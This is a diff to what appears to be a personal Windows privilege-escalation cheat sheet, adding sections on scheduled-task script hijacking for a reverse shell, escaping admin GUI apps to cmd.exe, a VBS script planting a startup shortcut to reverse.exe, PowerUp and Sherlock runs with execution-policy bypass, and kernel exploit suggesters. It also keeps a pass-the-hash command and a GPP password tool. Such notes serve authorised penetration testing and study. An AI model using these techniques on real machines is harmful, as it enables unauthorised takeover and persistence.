@@ -13,6 +13,14 @@ cmd> cd %TEMP%
 
 ## Enumeration
 
+### Find Process and its ACL
+
+```powershell
+Get-Process | findstr paint
+
+Get-Process -Name | Get-Acl
+```
+
 ### NetBIOS
 
 NetBIOS Name is a 16-byte name for a networking service or function on a machine running Microsoft Windows Server. NetBIOS names are a more friendly way of identifying computers on a network than network numbers.
@@ -482,12 +490,88 @@ OR even better login directly win pth-winexe
 pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' --system //192.168.111.xxx cmd.exe
 ```
 
+#### Scheduled Tasks compromise
+
+* Discovery
+
+`schtasks /query /fo LIST /v`
+
+or 
+
+``` powershell
+
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
+```
+
+* Find scripts use by scheduled task
+* Check permissions on script
+
+`accesschk.exe /accepteula -quv user scheduled_script.ps1`
+
+* If writeable, replace this script with a malicious executable to obtain reverse shell
+
+* Wait until task executes
+
+#### Insecure GUI Apps
+
+* find an app with GUI file access ran by admin
+
+```cmd
+
+tasklist /V | findstr admin_GUI.exe
+
+```
+
+* once found that app, click on "Open File..." and type in the navigation bar on top of the window `file://c:/windows/system32/cmd.exe`
+
+#### Startup Folder compromise
+
+* System startup folder is located in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` and if shortcut .lnk is place wihin then program linked shall autostart at reboot.
+
+* This can be exploited by creating and launching a .vbs script and waiting until admin logs in 
+
+```vbs
+# create_shortcut.vbs
+
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+* Activate this script `cscript create_shortcut.vbs`
+* Wait for admin
+
+#### Non MS Apps exploitation
+
+* On ExploitDB select `Windows -> Apps -> Privesc -> Has App`
+* Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
+* find the exploit on `exploit.db` as shown above
+
+#### Hot Potato
+
+
 
 ### Kernel Exploits
 
 * User Kernel only as last resort to Windows PrivEsc
 
-1. Exploit suggester
+* Exploit suggesters
+
+* Older systems:
+
+```cmd
+# If your ps1 file is downloaded 
+
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+```
+
+* New systems (more stealthy):
+
+1. wseng
 `https://github.com/bitsadmin/wesng`
 
 `python wes.py --update`
@@ -502,13 +586,8 @@ pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8
 ## remote enumeration
 
 * enum4linux
-
-## If you have your ps1 file downloaded to the victim machine then run using this
-```
-c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
-
-c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
-```
+* nmap scripts
+* crackmapexec
 
 ## RPC
 
@@ -565,7 +644,7 @@ see https://github.com/jonnyzar/windows-kernel-exploits
 ## Exposed GPP Password
 
 * Article to read: https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/
-* Use gp3finder tool once .xml file with cpassword is founf
+* Use gp3finder tool once .xml file with cpassword is found
 `docker run grimhacker/gp3finder -D edBSHOw...`
 
 ## Compiling Exploits for Windows on Kali
